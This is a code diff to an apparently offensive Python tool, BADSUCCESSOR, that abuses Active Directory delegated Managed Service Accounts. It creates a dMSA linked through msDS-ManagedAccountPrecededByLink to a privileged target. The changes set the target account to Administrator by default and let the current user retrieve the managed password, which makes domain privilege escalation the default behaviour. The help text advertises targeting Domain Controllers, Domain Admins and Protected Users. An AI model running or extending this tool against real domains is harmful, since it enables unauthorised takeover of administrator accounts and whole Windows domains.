@@ -501,7 +501,7 @@ class BADSUCCESSOR:
                 logging.error('dMSA account already exists: %s' % dmsa_dn)
                 return False
             
-            principals_allowed = self.__principalsAllowed if self.__principalsAllowed else 'Administrator'
+            principals_allowed = self.__principalsAllowed if self.__principalsAllowed else self.__username
             target_account = self.__targetAccount if self.__targetAccount else 'Administrator'
             
             dns_hostname = self.__dnsHostName if self.__dnsHostName else '%s.%s' % (self.__dmsaName.lower(), self.__domain)
@@ -598,10 +598,10 @@ if __name__ == '__main__':
 
     parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
     parser.add_argument('-dmsa-name', action='store', metavar='dmsa_name', help='Name of dMSA to add. If omitted, a random dMSA-[A-Z0-9]{8} will be used.')
-    parser.add_argument('-action', choices=['add',  'delete', 'search'], default='search', help='Action to perform: add (requires -principals-allowed, -target-account, -target-ou), delete (requires -dmsa-name, -target-ou), search a dMSA.')
+    parser.add_argument('-action', choices=['add',  'delete', 'search'], default='search', help='Action to perform: add (requires -target-ou), delete (requires -dmsa-name, -target-ou), search a dMSA.')
     parser.add_argument('-target-ou', action='store', metavar='OU_DN', help='Specific OU to check for dMSA creation capabilities (e.g., "OU=weakOU,DC=domain,DC=local")')
-    parser.add_argument('-principals-allowed', action='store', metavar='USERNAME', default='Administrator', help='Username allowed to retrieve the managed password. If omitted, Administrator will be used.')
-    parser.add_argument('-target-account', action='store', metavar='USERNAME', help='Target user or computer account DN to set for msDS-ManagedAccountPrecededByLink (can target Domain Controllers, Domain Admins, Protected Users, etc.)')
+    parser.add_argument('-principals-allowed', action='store', metavar='USERNAME', help='Username allowed to retrieve the managed password. If omitted, current username will be used.')
+    parser.add_argument('-target-account', action='store', metavar='USERNAME', default='Administrator', help='Target user or computer account DN to set for msDS-ManagedAccountPrecededByLink (can target Domain Controllers, Domain Admins, Protected Users, etc.)')
     parser.add_argument('-dns-hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA. If omitted, will be generated as dmsaname.domain.')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -628,8 +628,6 @@ if __name__ == '__main__':
 
     if options.action == 'add':
         required_args = []
-        if not options.target_account:
-            required_args.append('-target-account')
         if not options.target_ou:
             required_args.append('-target-ou')
         
